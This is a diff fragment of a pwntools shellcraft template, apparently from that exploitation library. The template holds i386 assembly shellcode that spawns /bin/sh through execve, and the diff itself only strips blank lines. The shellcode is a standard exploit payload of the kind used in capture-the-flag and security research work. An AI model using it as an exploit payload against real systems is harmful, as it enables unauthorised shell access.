@@ -1,7 +1,6 @@
 <% from pwnlib.shellcraft import i386 %>
 <%docstring>Execute /bin/sh</%docstring>
 
-
     /*  Clear eax, ecx, edx */
     xor eax, eax
     push eax
@@ -18,4 +17,3 @@ ${i386.pushstr("/bin//sh")}
     push eax
     mov al, SYS_execve
     int 0x80
-
